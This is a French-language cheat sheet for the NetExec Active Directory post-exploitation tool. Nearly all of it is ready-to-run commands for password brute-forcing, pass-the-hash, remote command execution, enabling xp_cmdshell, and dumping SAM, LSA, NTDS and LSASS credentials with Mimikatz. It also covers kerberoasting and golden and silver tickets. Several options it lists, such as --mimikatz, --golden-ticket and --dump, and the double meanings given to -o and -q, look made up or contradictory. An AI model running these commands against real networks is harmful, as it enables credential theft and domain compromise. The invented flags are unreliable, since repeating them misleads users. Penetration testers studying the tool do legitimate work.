# NetExec Cheat Sheet

## Overview

NetExec (anciennement CrackMapExec ou CME) est un outil de post-exploitation utilisé pour :

- Automatiser l'évaluation de grands réseaux Active Directory.
- Énumérer les utilisateurs, partages et sessions.
- Exécuter des commandes à distance.
- Extraire des credentials (NTLM, hachages).
- Réaliser des évaluations de sécurité autorisées.

NetExec fournit :

- Les protocoles SMB, WinRM, MSSQL, LDAP et RDP.
- Une architecture modulaire pour les extensions.
- Une exécution parallèle pour la rapidité.
- La réutilisation de credentials et les attaques pass-the-hash.
- L'intégration avec d'autres outils de pentesting.

```text
Utilisez NetExec uniquement contre des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite de test.
```

---

# 1. Starting NetExec

## Syntaxe de base

```bash
nxc <protocol> <target> [options]
```

## Afficher l'aide

```bash
nxc -h
```

## Afficher la version

```bash
nxc --version
```

## Mettre à jour NetExec

```bash
pipx upgrade netexec
```

Ou depuis le code source :

```bash
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pipx install .
```

## Protocoles disponibles

```bash
nxc smb -h
nxc winrm -h
nxc mssql -h
nxc ldap -h
nxc rdp -h
nxc vnc -h
```

---

# 2. Target Specification

## Cible unique

```bash
nxc smb <target-ip>
```

Exemple :

```bash
nxc smb 192.168.1.10
```

## Plusieurs cibles

```bash
nxc smb <target1> <target2> <target3>
```

Exemple :

```bash
nxc smb 192.168.1.10 192.168.1.11 192.168.1.12
```

## Cible depuis un fichier

```bash
nxc smb <file>
```

Exemple :

```bash
nxc smb targets.txt
```

## Sous-réseau cible

```bash
nxc smb <subnet>
```

Exemple :

```bash
nxc smb 192.168.1.0/24
```

## Cible avec port

```bash
nxc smb <target> --port <port>
```

Exemple :

```bash
nxc smb 192.168.1.10 --port 445
```

---

# 3. Authentication

## Sans authentification (null session)

```bash
nxc smb <target>
```

## Username et mot de passe

```bash
nxc smb <target> -u <username> -p <password>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Liste d'utilisateurs et mot de passe

```bash
nxc smb <target> -u <userfile> -p <password>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u users.txt -p password123
```

## Username et liste de mots de passe

```bash
nxc smb <target> -u <userfile> -p <passfile>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```

## Hachage NTLM

```bash
nxc smb <target> -u <username> -H <hash>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Clé AES

```bash
nxc smb <target> -u <username> -a <aes-key>
```

## Authentification Kerberos

```bash
nxc smb <target> -u <username> -k
```

## Utiliser les credentials en cache

```bash
nxc smb <target> --use-kcache
```

---

# 4. Enumeration

## Énumérer les utilisateurs

```bash
nxc smb <target> -u <username> -p <password> --users
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -p password123 --users
```

## Énumérer les groupes

```bash
nxc smb <target> -u <username> -p <password> --groups
```

## Énumérer les partages

```bash
nxc smb <target> -u <username> -p <password> --shares
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Énumérer les sessions

```bash
nxc smb <target> -u <username> -p <password> --sessions
```

## Énumérer les disques

```bash
nxc smb <target> -u <username> -p <password> --disks
```

## Énumérer les utilisateurs admin locaux

```bash
nxc smb <target> -u <username> -p <password> --local-admins
```

## Énumérer les utilisateurs connectés

```bash
nxc smb <target> -u <username> -p <password> --loggedon-users
```

## Énumérer RID cycling

```bash
nxc smb <target> -u <username> -p <password> --rid-brute
```

## Obtenir les informations du domaine

```bash
nxc smb <target> -u <username> -p <password> --domain-info
```

## Obtenir les informations du SE

```bash
nxc smb <target> -u <username> -p <password> --os-info
```

---

# 5. Command Execution

## Exécuter une commande

```bash
nxc smb <target> -u <username> -p <password> -x <command>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Exécuter une commande avec sortie

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method smbexec
```

## Exécuter une commande PowerShell

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method powershell
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "Get-Process" --exec-method powershell
```

## Exécuter une commande via WMI

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method wmi
```

## Exécuter une commande via MMC

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method mmcexec
```

## Exécuter une commande via atexec

```bash
nxc smb <target> -u <username> -p <password> -x <command> --exec-method atexec
```

## Exécuter un script PowerShell

```bash
nxc smb <target> -u <username> -p <password> -x <script> --exec-method powershell
```

## Exécuter un fichier

```bash
nxc smb <target> -u <username> -p <password> --exec-file <file>
```

---

# 6. Credential Dumping

## Extraire SAM

```bash
nxc smb <target> -u <username> -p <password> --sam
```

## Extraire LSA

```bash
nxc smb <target> -u <username> -p <password> --lsa
```

## Extraire NTDS

```bash
nxc smb <target> -u <username> -p <password> --ntds
```

## Extraire DPAPI

```bash
nxc smb <target> -u <username> -p <password> --dpapi
```

## Extraire les credentials

```bash
nxc smb <target> -u <username> -p <password> --dump
```

## Extraire LSASS

```bash
nxc smb <target> -u <username> -p <password> --lsass
```

## Mimikatz

```bash
nxc smb <target> -u <username> -p <password> --mimikatz
```

## Nanodump

```bash
nxc smb <target> -u <username> -p <password> --nanodump
```

## Extraire les certificats

```bash
nxc smb <target> -u <username> -p <password> --certificates
```

---

# 7. Pass-the-Hash

## Attaque pass-the-hash

```bash
nxc smb <target> -u <username> -H <hash>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Pass-the-hash avec commande

```bash
nxc smb <target> -u <username> -H <hash> -x <command>
```

## Overpass-the-hash

```bash
nxc smb <target> -u <username> -H <hash> --delegate <target>
```

## Silver ticket

```bash
nxc smb <target> -u <username> -H <hash> --silver-ticket <ticket>
```

## Golden ticket

```bash
nxc smb <target> -u <username> -H <hash> --golden-ticket <ticket>
```

---

# 8. Module Usage

## Lister les modules disponibles

```bash
nxc smb <target> -m
```

## Utiliser un module spécifique

```bash
nxc smb <target> -u <username> -p <password> -m <module>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Module avec options

```bash
nxc smb <target> -u <username> -p <password> -m <module> -o <option>=<value>
```

Exemple :

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz -o COMMAND=ls
```

## Modules communs

```bash
# Mimikatz
nxc smb <target> -u <username> -p <password> -m mimikatz

# Nanodump
nxc smb <target> -u <username> -p <password> -m nanodump

# Empire
nxc smb <target> -u <username> -p <password> -m empire_exec

# Metasploit
nxc smb <target> -u <username> -p <password> -m met_inject

# RDP
nxc smb <target> -u <username> -p <password> -m rdp

# VNC
nxc smb <target> -u <username> -p <password> -m vnc

# GPP
nxc smb <target> -u <username> -p <password> -m gpp_autologin

# Bloodhound
nxc smb <target> -u <username> -p <password> -m bloodhound
```

---

# 9. WinRM Protocol

## Scan WinRM de base

```bash
nxc winrm <target> -u <username> -p <password>
```

Exemple :

```bash
nxc winrm 192.168.1.10 -u admin -p password123
```

## Exécuter une commande via WinRM

```bash
nxc winrm <target> -u <username> -p <password> -x <command>
```

## Upload un fichier via WinRM

```bash
nxc winrm <target> -u <username> -p <password> --put-file <local> <remote>
```

## Download un fichier via WinRM

```bash
nxc winrm <target> -u <username> -p <password> --get-file <remote> <local>
```

## WinRM avec hachage

```bash
nxc winrm <target> -u <username> -H <hash>
```

---

# 10. MSSQL Protocol

## Scan MSSQL de base

```bash
nxc mssql <target> -u <username> -p <password>
```

## Exécuter une requête

```bash
nxc mssql <target> -u <username> -p <password> -q <query>
```

Exemple :

```bash
nxc mssql 192.168.1.10 -u sa -p password123 -q "SELECT @@version"
```

## Activer xp_cmdshell

```bash
nxc mssql <target> -u <username> -p <password> --enable-xp-cmdshell
```

## Exécuter une commande via xp_cmdshell

```bash
nxc mssql <target> -u <username> -p <password> -x <command>
```

## Extraire les hachages

```bash
nxc mssql <target> -u <username> -p <password> --dump-hashes
```

---

# 11. LDAP Protocol

## Scan LDAP de base

```bash
nxc ldap <target> -u <username> -p <password>
```

## Énumérer les utilisateurs

```bash
nxc ldap <target> -u <username> -p <password> --users
```

## Énumérer les groupes

```bash
nxc ldap <target> -u <username> -p <password> --groups
```

## Énumérer les ordinateurs

```bash
nxc ldap <target> -u <username> -p <password> --computers
```

## Énumérer les DCs

```bash
nxc ldap <target> -u <username> -p <password> --dc-list
```

## AS-REP roasting

```bash
nxc ldap <target> -u <username> -p <password> --asreproast
```

## Kerberoasting

```bash
nxc ldap <target> -u <username> -p <password> --kerberoasting
```

## Collection Bloodhound

```bash
nxc ldap <target> -u <username> -p <password> --bloodhound
```

## LDAP avec hachage

```bash
nxc ldap <target> -u <username> -H <hash>
```

---

# 12. Output Options

## Sauvegarder la sortie dans un fichier

```bash
nxc smb <target> -u <username> -p <password> -o <output-file>
```

## Sortie verbose

```bash
nxc smb <target> -u <username> -p <password> -v
```

## Sortie debug

```bash
nxc smb <target> -u <username> -p <password> -d
```

## Mode quiet

```bash
nxc smb <target> -u <username> -p <password> -q
```

## Afficher uniquement les résultats réussis

```bash
nxc smb <target> -u <username> -p <password> --show-success
```

## Afficher uniquement les résultats échoués

```bash
nxc smb <target> -u <username> -p <password> --show-fail
```

## Exporter les credentials

```bash
nxc smb <target> -u <username> -p <password> --export-creds <file>
```

---

# 13. Common Attack Scenarios

## Énumération de base

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Énumérer les partages

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Exécuter une commande

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Pass-the-hash

```bash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash
```

## Extraire les credentials

```bash
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Mimikatz

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Brute-force

```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
```

## Kerberoasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting
```

## AS-REP roasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --asreproast
```

## Bloodhound

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound
```

---

# 14. Practical Workflows

## Flux de travail de base d'énumération AD

```text
1. Identifier les domain controllers.
2. Énumérer les utilisateurs et groupes.
3. Vérifier les politiques de mots de passe.
4. Énumérer les partages et sessions.
5. Rechercher la réutilisation de credentials.
6. Documenter les résultats.
```

## Exemple : Énumération complète

```bash
# Scan de base
nxc smb 192.168.1.10 -u admin -p password123

# Énumérer les utilisateurs
nxc smb 192.168.1.10 -u admin -p password123 --users

# Énumérer les partages
nxc smb 192.168.1.10 -u admin -p password123 --shares

# Exécuter une commande
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"

# Extraire les credentials
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Exemple : Pass-the-hash

```bash
# Attaque PTH
nxc smb 192.168.1.10 -u admin -H hash

# Exécuter une commande avec PTH
nxc smb 192.168.1.10 -u admin -H hash -x "whoami"
```

## Exemple : Kerberoasting

```bash
# Kerberoast
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting

# Sauvegarder dans un fichier
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting > kerberoast.txt
```

## Exemple : Bloodhound

```bash
# Collecter les données Bloodhound
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound

# Avec collecteur spécifique
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound --collection all
```

---

# 15. Common Commands Reference

| Command | Description |
|---|---|
| `nxc smb <target>` | Scan SMB |
| `nxc winrm <target>` | Scan WinRM |
| `nxc mssql <target>` | Scan MSSQL |
| `nxc ldap <target>` | Scan LDAP |
| `nxc -u <user> -p <pass>` | Authentifier |
| `nxc -u <user> -H <hash>` | Pass-the-hash |
| `nxc --users` | Énumérer les utilisateurs |
| `nxc --groups` | Énumérer les groupes |
| `nxc --shares` | Énumérer les partages |
| `nxc --sessions` | Énumérer les sessions |
| `nxc -x <command>` | Exécuter une commande |
| `nxc --dump` | Extraire les credentials |
| `nxc --sam` | Extraire SAM |
| `nxc --lsa` | Extraire LSA |
| `nxc --ntds` | Extraire NTDS |
| `nxc -m <module>` | Utiliser un module |
| `nxc --mimikatz` | Exécuter Mimikatz |
| `nxc --kerberoasting` | Kerberoast |
| `nxc --asreproast` | AS-REP roast |
| `nxc --bloodhound` | Collection Bloodhound |

---

# 16. Troubleshooting

## Connection refused

- Vérifiez si la cible est accessible.
- Vérifiez que le port est ouvert (445, 5985, 1433, 389).
- Vérifiez les règles du firewall.
- Assurez-vous que le service est en cours d'exécution.

## Access denied

- Vérifiez que les credentials sont corrects.
- Vérifiez les permissions de l'utilisateur.
- Essayez une méthode d'authentification différente.
- Utilisez pass-the-hash si disponible.

## Exécution de commande échouée

- Essayez une exec-method différente.
- Vérifiez si la commande est autorisée.
- Assurez-vous que l'utilisateur a les droits d'exécution.
- Utilisez un protocole alternatif.

## Module non trouvé

- Mettez à jour NetExec.
- Vérifiez que le nom du module est correct.
- Assurez-vous que le module est installé.
- Listez les modules disponibles avec `-m`.

## Performance lente

- Réduisez les threads concurrents.
- Vérifiez la latence réseau.
- Utilisez des protocoles spécifiques.
- Limitez la portée de la cible.

---

# 17. Security Best Practices

## Vérifiez toujours les résultats

- Testez les credentials manuellement.
- Vérifiez l'exécution des commandes.
- Recoupez avec d'autres outils.
- Documentez tous les résultats.

## Respectez les limites légales

- Testez uniquement les systèmes que vous possédez.
- Obtenez une autorisation explicite.
- Suivez la divulgation responsable.
- Documentez toutes les activités.

## Minimisez l'impact

- Utilisez l'énumération appropriée.
- Évitez les scans agressifs.
- Testez pendant les fenêtres de maintenance.
- Surveillez les systèmes cibles.

## Maintenez les outils à jour

- Mettez régulièrement à jour NetExec.
- Restez informé des nouveaux modules.
- Suivez les advisories de sécurité.
- Testez dans des environnements contrôlés.

## Documentez tout

- Enregistrez toutes les commandes utilisées.
- Notez les credentials trouvés.
- Suivez les résultats d'énumération.
- Documentez les résultats et méthodes.

---

# 18. Important Reminders

- Obtenez toujours une autorisation explicite avant d'utiliser NetExec.
- Testez d'abord dans un environnement de laboratoire contrôlé.
- Certains modules peuvent déclencher des alertes de sécurité.
- Respectez les limites et politiques réseau.
- Maintenez NetExec à jour régulièrement.
- Validez les résultats manuellement.
- Documentez toutes les actions et commandes.
- Préservez les preuves originales et les logs.
- Comprenez les implications légales et éthiques.
- Nettoyez après les tests.

---

# 19. Quick Reference Examples

## Scan SMB de base

```bash
nxc smb 192.168.1.10 -u admin -p password123
```

## Énumérer les partages

```bash
nxc smb 192.168.1.10 -u admin -p password123 --shares
```

## Exécuter une commande

```bash
nxc smb 192.168.1.10 -u admin -p password123 -x "whoami"
```

## Pass-the-hash

```bash
nxc smb 192.168.1.10 -u admin -H hash
```

## Extraire les credentials

```bash
nxc smb 192.168.1.10 -u admin -p password123 --dump
```

## Mimikatz

```bash
nxc smb 192.168.1.10 -u admin -p password123 -m mimikatz
```

## Kerberoasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --kerberoasting
```

## AS-REP roasting

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --asreproast
```

## Bloodhound

```bash
nxc ldap 192.168.1.10 -u admin -p password123 --bloodhound
```

## Exécution WinRM

```bash
nxc winrm 192.168.1.10 -u admin -p password123 -x "whoami"
```

---

# 20. Additional Resources

## NetExec Official

```text
https://github.com/Pennyw0rth/NetExec
```

## NetExec Documentation

```text
https://www.netexec.wiki/
```

## CrackMapExec Legacy

```text
https://github.com/byt3bl33d3r/CrackMapExec
```

## Active Directory Security

```text
https://www.ired.team/
```

## Bloodhound

```text
https://github.com/BloodHoundAD/BloodHound
```
